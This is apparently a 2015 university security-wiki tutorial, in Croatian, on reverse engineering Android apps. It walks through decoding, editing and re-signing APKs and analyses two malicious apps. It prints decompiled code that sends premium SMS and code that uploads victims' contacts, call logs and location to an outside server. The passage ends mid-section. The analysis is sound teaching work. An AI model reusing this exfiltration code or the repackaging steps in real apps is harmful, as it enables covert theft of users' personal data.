@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+<html lang="hr" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Reverzni inžinjering Android aplikacija - SIS Wiki</title>
+<meta name="generator" content="MediaWiki 1.17.0" />
+<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
+<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
+<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Reverzni_in%C5%BEinjering_Android_aplikacija&amp;action=creativecommons" rel="meta" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
+<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr ns-0 ns-subject page-Reverzni_inžinjering_Android_aplikacija skin-vector">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading">Reverzni inžinjering Android aplikacija</h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+				<!-- tagline -->
+				<div id="siteSub">Izvor: SIS Wiki</div>
+				<!-- /tagline -->
+				<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav">
+					Skoči na: <a href="Reverzni_inžinjering_Android_aplikacija.html#mw-head">orijentacija</a>,
+					<a href="Reverzni_inžinjering_Android_aplikacija.html#p-search">traži</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodytext -->
+				<p>Članovi tima: 
+</p><p>-Mario Mojsinović
+</p><p><br />
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mario.mojsinovic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mario.mojsinovic (stranica ne postoji)">Mario.mojsinovic</a> 10:46, 30. listopada 2015. (CET)
+</p><p><br />
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Reverzni_inžinjering_Android_aplikacija.html#Uvod"><span class="tocnumber">1</span> <span class="toctext">Uvod</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Reverzni_inžinjering_Android_aplikacija.html#Op.C4.87enito_o_Android_aplikacijama"><span class="tocnumber">2</span> <span class="toctext">Općenito o Android aplikacijama</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="Reverzni_inžinjering_Android_aplikacija.html#Hello_World"><span class="tocnumber">3</span> <span class="toctext">Hello World</span></a></li>
+<li class="toclevel-1 tocsection-4"><a href="Reverzni_inžinjering_Android_aplikacija.html#Brisanje_poruke_na_lockscreen-u"><span class="tocnumber">4</span> <span class="toctext">Brisanje poruke na lockscreen-u</span></a></li>
+<li class="toclevel-1 tocsection-5"><a href="Reverzni_inžinjering_Android_aplikacija.html#Fake_flappy_bird"><span class="tocnumber">5</span> <span class="toctext">Fake flappy bird</span></a></li>
+<li class="toclevel-1 tocsection-6"><a href="Reverzni_inžinjering_Android_aplikacija.html#Find_and_Call"><span class="tocnumber">6</span> <span class="toctext">Find and Call</span></a></li>
+<li class="toclevel-1 tocsection-7"><a href="Reverzni_inžinjering_Android_aplikacija.html#Obfuskacija_koda"><span class="tocnumber">7</span> <span class="toctext">Obfuskacija koda</span></a></li>
+<li class="toclevel-1 tocsection-8"><a href="Reverzni_inžinjering_Android_aplikacija.html#Stati.C4.8Dka_analiza"><span class="tocnumber">8</span> <span class="toctext">Statička analiza</span></a></li>
+<li class="toclevel-1 tocsection-9"><a href="Reverzni_inžinjering_Android_aplikacija.html#Zaklju.C4.8Dak"><span class="tocnumber">9</span> <span class="toctext">Zaključak</span></a></li>
+<li class="toclevel-1 tocsection-10"><a href="Reverzni_inžinjering_Android_aplikacija.html#Literatura"><span class="tocnumber">10</span> <span class="toctext">Literatura</span></a></li>
+</ul>
+</td></tr></table>
+<h2> <span class="mw-headline" id="Uvod"> Uvod </span></h2>
+<p>Reverzni inženjering prestavlja način na koji otkrivamo kako uređaj, objekt ili sustav radi kroz analizu istoga. Neke od primjena su: 
+</p>
+<pre>- Analiza zloćudnog (eng. malware) koda
+- Analiza hardware i embedded uređaja
+- Sigurnosni propusti
+- Bypass programskih zaštita (eng. cracking)
+- Izgubljeni dokumenti
+- Špijunaža
+</pre>
+<p>Pojavljuje se 80-ih, kako bi se zaobišla zaštita računalnih igara i programa, a 90-ih se već pojavljuju i virusi. Kako je Android operacijski sustav sa velikom bazom korisnika  laka je meta za napadače, kao što prikazuju podaci na slici. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Marketshare.png" class="image"><img alt="Marketshare.png" src="../images/a/a0/Marketshare.png" width="671" height="170" /></a>
+</p><p>Google Android je razvijen od strane Google Inc, te je prvi puta predstavljen 5.11.2007. godine. To je otvoreni operacijski sustav namijenjen za mobilne uređaje (mobilni telefoni, tableti, netbook računala, Google TV i slično) a zadnja verzija je 6.0 - naziva "Marshmallow". 
+</p>
+<h2> <span class="mw-headline" id="Op.C4.87enito_o_Android_aplikacijama"> Općenito o Android aplikacijama </span></h2>
+<p>Android aplikacije imaju ekstenziju APK: 
+</p>
+<pre>- to je zapravo zip/jar ekstenzija
+- nema specifičnog načina imenovanja
+- SHA1 se može promijeniti bez narušavanja provjere potpisa
+- uobičajeno imenovanje: com.package.name.apk
+- pomoću adb-a (eng. Android Debug Bridge) možemo dobiti putanju aplikacije: pm list path com.package.name
+- aplikaciju možemo ekstraktirati bilo kojim rar/zip programom 
+</pre>
+<p>Test.apk sadrži sljedeće direktorije/datoteke: 
+</p>
+<pre>- meta-inf/manifest.mf - tekstualna datoteka, sadrži imena datoteka i kodiran blob
+-         /cert.name(RSA|DSA) - javni potpis developera, self-signed
+-         /cert_name.sf - manifest datoteka potpisa
+- lib/armeabi (-v7a)/lib*.so - nativne ELF biblioteke, tip ovisi o načinu kompajliranja
+      arm64-v8a/
+      x86/
+      mips/
+- res/ drawable-*/ *png - resource datoteke - slike, xml (layout), raw "binary" datoteke, zvučne datoteke, učitavanje pomoću asset manager-a
+- xml/	*.xml 
+- raw/	...
+- ...
+- assets/
+- AndroidManifest.xml - početne točke aplikacije, dozvole, verzija aplikacije...
+- classes.dex - dalvik izvršni kod, ODEX - DVM runtime, OAT - ART runtime
+- resources.arsc - r.java, strings.xml, layouts.xml, ids.xml datoteke
+- *
+</pre>
+<p>Android radi na način da "runtime" - što možemo opisati kao biblioteku koja pretvara naš high-level kod iz Jave u kod prihvatljiv za CPU u mobilnom uređaju. Postoje dvije vrste "runtime-a": Dalvik (stariji) i ART (noviji, službeno od verzije 5.0). Dalvik koristi Just in Time kompajler, što znači da se pri svakom pokretanju aplikacije, byte code interpretira liniju po liniju. 
+</p><p>ART koristi Ahead of Time kompajler, jednom kad je aplikacije instalirana, cijeli byte code je konvertiran u "machine code" i pohranjen u memoriju mobilnog uređaja - događa se samo jednom. Pri svakom pokretanju aplikacije, "machine code" je pokrenut direktno sa memorije uređaja. Uzima više prostora memorije, no teoretski troši manje CPU i RAM resursa. Po mom iskustvu, AOT dosta ubrzava rad, no troši više baterije, iako bi teoretski i to trebalo biti smanjeno.
+</p><p><br />
+Na slici prikazan je životni ciklus jedne aktivnosti, a metode onCreate(), onStart() i onStop() su ulazne točke preopterećene od strane developera. Kreiranje jedne aktivnosti nasljeđuje 7 potencijalno preopterećenih klasa. 
+<a href="http://security.foi.hr/wiki/index.php/Datoteka:Alifecycle.png" class="image"><img alt="Alifecycle.png" src="../images/6/67/Alifecycle.png" width="538" height="668" /></a>
+</p><p><br />
+Proces kompajliranja android aplikacije: 
+</p>
+<pre>- AAPT (Asset Packaging Tool) kompajlira sve potrebne resurse (layout i slično) 
+- .java datoteke kompajliraju se, zatim pretvaraju u java byte code, te se komapjliraju za dalvik (machine code), čime se dobije Dalvik byte code datoteka (.dex) 
+- Zatim se kompajlira i potpisuje apk datoteka
+</pre>
+<p>Prilikom dekodiranja apk datoteke pomoću raznih alata, u većini slučajeva .dex datoteke pretvaraju se u .smali datoteke, radi lakšeg čitanja, iako postoje i alati koji .dex pretvaraju u .jar, pa zatim dobijemo .class datoteke koje izgledaju kao .java datoteke.
+</p><p>Proces izmjene bytecode-a: 
+</p>
+<pre>- Apktool/baksmali, dekodiramo classes.dex datoteku iz .apk-a
+- U .smali datoteku unosimo promjene
+- Kompajliramo classes.dex datoteku s novim promjenama
+- Zip/potpis APK-a</pre>
+<p>Java kod: 
+</p>
+<pre> public class StartActivity extends Activity {
+ @Override
+ protected void onCreate(
+ Bundle savedInstanceState) {
+ super.onCreate(savedInstanceState);
+ setContentView(R.layout.activity_start);
+ Log.i(&quot;StartActivity:&quot;, “Message&quot;);
+} </pre>
+<p>Smali kod:
+</p>
+<pre>#virtual methods
+.method protected onCreate(Landroid/os/Bundle;)V
+ .locals 3
+ .parameter &quot;savedInstanceState&quot;
+ .prologue
+ invoke-super {p0, p1}, Landroid/app/Activity
+ ;-&gt;onCreate(Landroid/os/Bundle;)V
+ const/high16 v0, 0x7f03
+ const-string v0, &quot;StartActivity:&quot;
+ const-string v1, “Message
+ invoke-static {v0, v1}, Landroid/util/Log;
+ -&gt;d(Ljava/lang/String;Ljava/lang/String;)I
+ move-result v0
+ return-void
+end method</pre>
+<p><i>Log.i("StartActivity:", "Message");</i> odgovara <i>const-string v0, "StartActivity:"....move-result v0</i> dijelu.
+</p><p>Informacije o klasi: 
+</p>
+<pre>.class public Lcom/apkudo/util/Serializer;
+.super Ljava/lang/Object;
+.source &quot;Serializer.java&quot; </pre>
+<p>Statična polja: 
+</p>
+<pre>#static fields 
+.field public static final TAG:Ljava/lang/String;= &quot;String&quot; </pre>
+<p>Metode:
+</p>
+<pre># direct methods
+.method public constructor &lt;init&gt;()V
+ .registers 1
+ .prologue
+ .line 5
+ invoke-direct {p0}, Ljava/lang/Object;-&gt;&lt;init&gt;()V
+ return-void
+.end method </pre>
+<p><i>.method private nešto()V</i> - V predstavlja tip metode (void, boolean, byte, short, char, float, int...). 
+Klase su prefiksirane slovom L, a sufiksirane&#160;; znakom&#160;: <i>Lcom/example/myapp/MyClass;</i>
+</p><p>Jedan, a skoro i jedini način kako "naučiti" Smali je pisanje jednostavnijeg koda u Javi, zatim kompajliranje i dekodiranje u Smali, kako bi vidjeli što se zapravo događa.
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Hello_World"> Hello World </span></h2>
+<p>Prije no što možemo krenuti sa primjerima, moramo instalirati sljedeće programe: 
+</p><p>1. Android SDK [2]. Dobra ideja je skinuti isti zajedno s Android Studiom, radi kreiranja HelloWorld aplikacije, iako istu vjerojatno možemo pronaći i na web-u. 
+</p><p>2. Java JDK [3]. Pripaziti da je putanja mape JDK-a dodana u Path varijablu - pod Environment variables. 
+</p><p>3. Apktool [4]. Program koji nema GUI, koristi se iz komandne linije. Omogućava dekodiranje/kompajliranje aplikacije, smali debugging (iako je od zadnje verzije depreceted).
+</p><p>4. Sublime Text[5] (opcionalno). 
+</p><p>Za početak sam kreirao primjer aplikacije u Android Studiu.  
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:As1.png" class="image"><img alt="As1.png" src="../images/thumb/8/89/As1.png/700px-As1.png" width="700" height="530" /></a>
+</p><p>Nije potrebno mijenjati stvari navedene na slici, a na idućem koraku koji je prikazan na slici, biramo minimalnu verziju Android-a. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:As2.png" class="image"><img alt="As2.png" src="../images/thumb/5/5a/As2.png/700px-As2.png" width="700" height="530" /></a>
+</p><p>Zatim odabiremo Blank Activity, te Next i Finish. Prije pokretanja aplikacije, potrebno je spojiti smartphone na računalo putem adb-a (USB ili Wi-Fi), a možemo koristiti i emulator.
+Nakon što kompajliramo aplikaciju, dobiti ćemo sljedeći ekran: 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:As3.png" class="image"><img alt="As3.png" src="../images/thumb/f/f9/As3.png/500px-As3.png" width="500" height="889" /></a>
+</p><p>Ispisana je poruka Hello World, a u sljedećim koracima prikazat ću kako to možemo promijeniti. 
+</p><p>Apk datoteka novokreirane aplikacije nalazi se u C:\Users\X\AndroidStudioProjects\ProbaSIS\app\build\outputs\apk, naziva app-debug.apk. 
+Kako bi dekodirali željenu apk datoteku, koristimo naredbu: 
+</p>
+<pre>- apktool d &lt;ime_apk-a.apk&gt;
+</pre>
+<p>Kao što je prikazano na slici. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:As4.png" class="image"><img alt="As4.png" src="../images/thumb/4/42/As4.png/500px-As4.png" width="500" height="262" /></a> 
+</p><p>Dekodirane datoteke možemo pronaći u mapi app-debug, osim ako nismo naveli drugačije. 
+</p><p>Kako bih najlakše pronašao string kojeg tražim, u ovom slučaju "Hello World", koristio sam alat Sublime Text. Pritiskom tipki Ctrl+Shift+F možemo pretražiti željenu mapu prema navedenom upitu, kao što je prikazano na slici ispod. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:As5.png" class="image"><img alt="As5.png" src="../images/thumb/9/92/As5.png/600px-As5.png" width="600" height="320" /></a>
+</p><p>String Hello World pronađen je u datoteci content_main.xml, koja se nalazi u mapi res/layout, te smo sadržaj promijenili u Hello SIS!, kao što je prikazano na slici ispod. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:As6.png" class="image"><img alt="As6.png" src="../images/thumb/3/31/As6.png/600px-As6.png" width="600" height="320" /></a>
+</p><p>Kako bi kompajlirali novu verziju aplikacije, upisujemo sljedeću naredbu: 
+</p>
+<pre>- apktool b &lt;ime_mape&gt; -o ime_aplikacije.apk
+</pre>
+<p>Što možemo vidjeti na slici. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:As7.png" class="image"><img alt="As7.png" src="../images/thumb/4/46/As7.png/500px-As7.png" width="500" height="263" /></a>
+</p><p>Zatim moramo kreirati našu keystore datoteku, kojom ćemo potpisati novu verziju aplikacije. Otvorimo cmd (Komandnu liniju), te upišemo sljedeću naredbu:
+</p>
+<pre>- keytool -genkey -v -keystore tinker.keystore -alias tinker_key -keyalg RSA -keysize 2048  -validity 10000
+</pre>
+<p>Unosimo podatke kao što je ime, prezime, grad i sl. Također je potrebno unijeti password za keystore i ključ, te je nakon toga u mapi iz koje smo pozvali naredbu, kreirana tinker.keystore datoteka.
+</p><p>Radi lakšeg rada možemo kopirati .keystore datoteku u mapu gdje je i nova verzija aplikacije (apk). Kako bi potpisali aplikaciju, pišemo: 
+</p>
+<pre>- jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore &lt;imekeystoredatoteke.keystore&gt; &lt;imeapka.apk&gt; tinker_key
+</pre>
+<p>Upisujemo lozinke kako bi završili sa potpisivanjem, a prije instalacije se može provjeriti ispravnost potpisa naredbom: 
+</p>
+<pre>- jarsigner -verify -verbose -certs &lt;imeapk.apk&gt;
+</pre>
+<p>Zatim možemo instalirati aplikaciju na smartphone koristeći naredbu: 
+</p>
+<pre>- adb install -r &lt;imeapk.apk&gt;  - r -&gt; reinstall, imamo početnu verziju
+</pre>
+<p>Slika ispod prikazuje kako izgleda nova verzija aplikacije. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:As8.png" class="image"><img alt="As8.png" src="../images/thumb/7/7f/As8.png/500px-As8.png" width="500" height="889" /></a>
+</p>
+<h2> <span class="mw-headline" id="Brisanje_poruke_na_lockscreen-u"> Brisanje poruke na lockscreen-u </span></h2>
+<p>Za drugi primjer odabrao sam brisanje "Swipe to unlock" poruke na lockscreen-u. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:As9.jpg" class="image"><img alt="As9.jpg" src="../images/thumb/b/b5/As9.jpg/500px-As9.jpg" width="500" height="889" /></a>
+</p><p>Trebaju nam i framework-res.apk te SemcGenericUxpRes datoteke, koje instaliramo kao framework u apktool. Navedene datoteke možemo "povući" s naredbom adb pull: 
+</p>
+<pre>- adb pull system/app/XperiaLockScreen.apk
+- adb pull system/framework/framework-res.apk
+- adb pull system/framework/SemcGenericUxpRes.apk
+</pre>
+<p>Naredbama: 
+</p>
+<pre>- apktool if framework-res.apk 
+- apktool if SemcGenericUxpRes.apk 
+</pre>
+<p>Instaliramo framework, kako bi mogli dekotirati aplikaciju, naredbom: 
+</p>
+<pre>- apktool d XperiaLockScreen.apk 
+</pre>
+<p>U mapi XperiaLockScreen imamo sadržaj aplikacije, a najlakše ćemo željeni string pronaći pomoću Sublime Text-a i mogućnosti koju sam prikazao u primjeru 1. String "Swipe to unlock" pronađen je u datoteci strings.xml, kao što je opisano ispod: 
+</p>
+<pre>- &lt;string name="lockscreen_short_unlock_hint"&gt;Swipe to unlock&lt;/string&gt;
+</pre>
+<p>Što mijenjamo u: 
+</p>
+<pre>- &lt;string name="lockscreen_short_unlock_hint"/&gt;
+</pre>
+<p>Kompajliramo aplikaciju, potpisujemo, te eventualno provjeravamo potpis: 
+</p>
+<pre>- apktool b XperiaLockScreen -o XperiaLockScreen.apk 
+- jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore tinker.keystore XperiaScreenLock.apk tinker_key
+</pre>
+<p>Prijenos možemo obaviti pomoću Root Explorera ili slične aplikacije. Kopiramo na željeno mjesto, te postavimo prava za izvođenje. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:As10.png" class="image"><img alt="As10.png" src="../images/thumb/5/56/As10.png/500px-As10.png" width="500" height="889" /></a>
+</p>
+<h2> <span class="mw-headline" id="Fake_flappy_bird"> Fake flappy bird </span></h2>
+<p>Za idući primjer odabrao sam android malware, te kako pomoću reverznog inženjeringa možemo kroz 10 minuta vidjeti da aplikacija ima čudne "namjere". 
+Apk datoteku sam pronašao na linku [11], te ju možemo dekodirati pomoću apktool-a, koristeći naredbu: 
+</p>
+<pre>- apktool d flappy-bird.apk
+</pre>
+<p>Koristeći apktool, .dex datoteka će biti pretvorena u .smali datoteke. Kako to izgleda, možemo vidjeti ispod:
+</p>
+<pre> .class Lcom/hdc/bookmark3934/MainActivity$1$2;
+.super Ljava/lang/Object;
+.source &quot;MainActivity.java&quot;
+# interfaces
+.implements Landroid/content/DialogInterface$OnClickListener;
+# annotations
+.annotation system Ldalvik/annotation/EnclosingMethod;
+    value = Lcom/hdc/bookmark3934/MainActivity$1;-&gt;onTouch(Landroid/view/View;Landroid/view/MotionEvent;)Z
+.end annotation
+.annotation system Ldalvik/annotation/InnerClass;
+    accessFlags = 0x0
+    name = null
+.end annotation
+# instance fields
+.field final synthetic this$1:Lcom/hdc/bookmark3934/MainActivity$1;
+# direct methods
+.method constructor &lt;init&gt;(Lcom/hdc/bookmark3934/MainActivity$1;)V
+    .locals 0
+    .prologue
+    .line 1
+    iput-object p1, p0, Lcom/hdc/bookmark3934/MainActivity$1$2;-&gt;this$1:Lcom/hdc/bookmark3934/MainActivity$1;
+    .line 174
+    invoke-direct {p0}, Ljava/lang/Object;-&gt;&lt;init&gt;()V
+    return-void
+.end method
+# virtual methods
+.method public onClick(Landroid/content/DialogInterface;I)V
+    .locals 0
+    .param p1, &quot;dialog&quot;    # Landroid/content/DialogInterface;
+    .param p2, &quot;which&quot;    # I
+    .prologue
+    .line 179
+    invoke-interface {p1}, Landroid/content/DialogInterface;-&gt;dismiss()V
+    .line 180
+    return-void
+.end method</pre>
+<p>Kao što vidimo, smali kod je teži za čitanje, pa nam tu može pomoći jedan alat naziva Bytecode Viewer[17]. Pokrenemo alat (Bytecode Viewer 2.9.8.jar datoteku), te otvorimo apk datoteku flappy-bird.apk. Na slici ispod možemo vidjeti kako to izgleda.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Bcv.png" class="image"><img alt="Bcv.png" src="../images/thumb/2/21/Bcv.png/500px-Bcv.png" width="500" height="266" /></a>
+</p><p>Otvorimo li mapu "Decoded resources", te AndroidManifest.xml datoteku, možemo vidjeti da aplikacija zahtjeva dozvole za slanje sms-a - što odmah predstavlja upitnik nad glavom - zašto bi Flappy Bird igra tražila dozvolu za slanje SMS-a? Također, pri instalaciji aplikacija, valja pripaziti koje dozvole aplikacije zahtjeva za rad.
+Bytecode viewer alat može pretvoriti classes.dex datoteku u jar, iz kojih možemo vidjeti .class datoteke koje su dosta slične .java datotekama, no u slučaju obsfukacije, teže su razumljivi.
+</p><p>Na slici ispod možemo vidjeti kako izgledaju .class i .smali datoteke. 
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Bcv2.png" class="image"><img alt="Bcv2.png" src="../images/thumb/4/41/Bcv2.png/500px-Bcv2.png" width="500" height="266" /></a>
+</p><p>Pri kreiranju glavne aktivnosti možemo vidjeti da se poziva metoda getSimNetwork(), koja izgleda ovako: 
+</p>
+<pre>private boolean getSimNetwork()
+  {
+    boolean bool = true;
+    this.dialog = new Dialog_Waitting(this, 1);
+    this.dialog.show();
+    TelephonyManager localTelephonyManager = (TelephonyManager)getSystemService(&quot;phone&quot;);
+    String str = localTelephonyManager.getNetworkOperator();
+    if ((str == null) || (str.equals(&quot;&quot;))) {
+      return false;
+    }
+    int i = Integer.parseInt(str.substring(3));
+    switch (Integer.valueOf(localTelephonyManager.getSimState()).intValue())
+    {
+    default: 
+      switch (i)
+      {
+      case 3: 
+      case 6: 
+      default: 
+        this.typeNetwork = &quot;OTHER&quot;;
+      }
+      break;
+    }
+    for (;;)
+    {
+      this.dialog.dismiss();
+      return bool;
+      bool = false;
+      break;
+      bool = false;
+      break;
+      bool = false;
+      break;
+      bool = false;
+      break;
+      bool = true;
+      break;
+      bool = false;
+      break;
+      this.typeNetwork = &quot;VMS&quot;;
+      continue;
+      this.typeNetwork = &quot;VNP&quot;;
+      continue;
+      this.typeNetwork = &quot;VTT&quot;;
+      continue;
+      this.typeNetwork = &quot;VIETNAM_MOBILE&quot;;
+      continue;
+      this.typeNetwork = &quot;BEELINE&quot;;
+    }
+  } </pre>
+<p>Metoda kroz objekt TelephonyManagera dolazi do naziva mreže koju koristimo. Zatim sam pronašao klasu koja šalje poruku nepoznatoj adresi, koja izgleda ovako: 
+</p>
+<pre>class SendSMS$2
+  implements Runnable{
+  SendSMS$2(Context paramContext, String paramString) {}
+  public void run()
+  {
+  try{
+      PendingIntent localPendingIntent1 = PendingIntent.getBroadcast(this.val$instance, 0, new Intent(SendSMS.SENT), 0);
+      PendingIntent localPendingIntent2 = PendingIntent.getBroadcast(this.val$instance, 0, new Intent(SendSMS.DELIVERED), 0);
+      SmsManager.getDefault().sendTextMessage(SendSMS.address, null, this.val$data, localPendingIntent1, localPendingIntent2);
+      return;
+    }catch (Exception localException){
+      localException.printStackTrace();
+    }
+  }
+}
+ </pre>
+<p>Koristeći SmsManager sendTextMessage metodu, šalje se poruka na nepoznatu adresu. Također, valja napomenuti da sam u kodu pronalazio razna logiranja, tipa "SMS Send", ili slično.
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Find_and_Call"> Find and Call </span></h2>
+<p>Za sljedeći primjer odabrao sam aplikaciju Find and Call [10], koja se prvotno pojavila na App Store i Play Store servisima. Za dekodiranje koristiti ću Bytecode viewer, kao i u prošlom primjeru. 
+</p><p>Otvorimo li AndroidManifest.xml datoteku iz mape "Decoded resources", zanimljiv dio je prikazan ispod: 
+</p>
+<pre> &lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot;/&gt;
+    &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot;/&gt;
+ </pre>
+<p>Aplikacija traži dozvole za čitanje kontakata, GPS lokaciju, te čitanje SMS poruka, između ostaloga. 
+Aplikacija čita i šalje listu kontakata na stranicu hxxp://abonent.findandcall.com/, a to prikazuje sljedeći kod: 
+</p>
+<pre> for (;;)
+    {
+      if (!localIterator.hasNext())
+      {
+        localStringBuffer.append(&quot;&lt;/records&gt;&lt;/info&gt;&quot;);
+        String str1 = localStringBuffer.toString();
+        Object[] arrayOfObject = new Object[2];
+        arrayOfObject[0] = &quot;http://abonent.findandcall.com&quot;;
+        arrayOfObject[1] = Config.getSessionId();
+        new ServerCaller(null, String.format(&quot;%s/profile/phoneBook?sid=%s&quot;, arrayOfObject), &quot;POST&quot;, str1).run();
+        return Integer.valueOf(0);
+        String str2 = localCursor.getString(localCursor.getColumnIndex(&quot;_id&quot;));
+        if (CollectContactsOperation.Contact.access$0(new CollectContactsOperation.Contact(this, str2)).size() &lt;= 0) {
+          break;
+        }
+        localArrayList.add(new CollectContactsOperation.Contact(this, str2));
+        i++;
+        if (i&#160;% 100&#160;!= 0) {
+          break;
+        }
+        Log.i(&quot;CONTACTS&quot;, &quot;added &quot; + i + &quot; contacts&quot;);
+        break;
+      }
+      localStringBuffer.append(((CollectContactsOperation.Contact)localIterator.next()).toXML());
+    }
+  }
+</pre>
+<p>Dalje, imamo metodu koja uploada popis poziva: 
+</p>
+<pre> protected CallLogResult doInBackground(Integer... paramVarArgs)
+  {
+    Object[] arrayOfObject = new Object[2];
+    arrayOfObject[0] = &quot;http://abonent.findandcall.com&quot;;
+    arrayOfObject[1] = paramVarArgs[0];
+    new ServerCaller(this, String.format(&quot;%s/call/list?version=%d&quot;, arrayOfObject)).run();
+    return this.result;
+  }
+</pre>
+<p>Zatim, postoji i metoda koja šalje točnu lokaciju, a ona izgleda ovako: 
+</p>
+<pre>  protected FindGpsLocationResult doInBackground(Location... paramVarArgs)
+  {
+    String str = Double.valueOf(paramVarArgs[0].getLatitude()).toString().replace(',', '.');
+    new ServerCaller(this, String.format(&quot;%s/system/findLocationByPosition?longitude=%s&amp;latitude=%s&quot;, new Object[] { &quot;http://abonent.findandcall.com&quot;, Double.valueOf(paramVarArgs[0].getLongitude()).toString().replace(',', '.'), str })).run();
+    return this.result;
+  }
+</pre>
+<p>Također, opet se pronalaze razna logiranja, tipa "Contacts added", ili slično. Aplikacija podatke koje želi sprema u lokalnu bazu na uređaju, kao što prikazuje metoda ispod:
+</p>
+<pre> private List&lt;Map&lt;String, String&gt;&gt; processNewCallLog(CallLogResult paramCallLogResult)
+  {
+    SQLiteDatabase localSQLiteDatabase = new DBOpenHelper(this).getWritableDatabase();
+    localSQLiteDatabase.delete(&quot;call_logs&quot;, null, new String[0]);
+    Iterator localIterator = paramCallLogResult.getData().iterator();
+    for (;;)
+    {
+      if (!localIterator.hasNext())
+      {
+        localSQLiteDatabase.close();
+        return getCallLogData();
+      }
+      Map localMap = (Map)localIterator.next();
+      ContentValues localContentValues = new ContentValues();
+      localContentValues.put(&quot;call_id&quot;, Integer.valueOf(Integer.parseInt((String)localMap.get(&quot;call_id&quot;))));
+      localContentValues.put(&quot;dtn_id&quot;, Integer.valueOf(Integer.parseInt((String)localMap.get(&quot;id&quot;))));
+      localContentValues.put(&quot;deleted&quot;, Integer.valueOf(Integer.parseInt((String)localMap.get(&quot;deleted&quot;))));
+      localContentValues.put(&quot;call_date&quot;, Long.valueOf(Long.parseLong((String)localMap.get(&quot;call_date&quot;))));
+      localContentValues.put(&quot;version&quot;, Integer.valueOf(paramCallLogResult.getVersion()));
+      localContentValues.put(&quot;name&quot;, (String)localMap.get(&quot;name&quot;));
+      localContentValues.put(&quot;nickname&quot;, (String)localMap.get(&quot;nickname&quot;));
+      localContentValues.put(&quot;avatar&quot;, (String)localMap.get(&quot;avatar&quot;));
+      localContentValues.put(&quot;type&quot;, (String)localMap.get(&quot;name&quot;));
+      localContentValues.put(&quot;provider&quot;, (String)localMap.get(&quot;provider&quot;));
+      String str = (String)localMap.get(&quot;contact&quot;);
+      if ((str == null) || (str.trim().length() == 0)) {
+        str = (String)localMap.get(&quot;nickname&quot;);
+      }
+      localContentValues.put(&quot;contact&quot;, str);
+      localSQLiteDatabase.insert(&quot;call_logs&quot;, null, localContentValues);
+    }
+  }
+</pre>
+<p>Svaki kontakt iz korisnikove liste kontakata dobiti će SMS spam, koji će izgledati vjerodostojno, tipa: "Now I’m here and it’s easier to reach me with the help of free application [URL]". 
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Obfuskacija_koda"> Obfuskacija koda </span></h2>
+<p>Obfuskacija koda podrazumijeva stvaranje istoga nečitkim i nama nerazumljivim , čineći ga različitim od izvornog programskog jezika.
+</p>
+<pre> class OriginalHello {
+   public OriginalHello() {
+       int number=1;
+   }
+   public String getHello(String helloname){
+       return helloname;
+}</pre>
+<p>Obfuskacijom postaje: 
+</p>
+<pre> class a {
+   public static boolean a;
+   public a() {
+      int a=1;
+   }
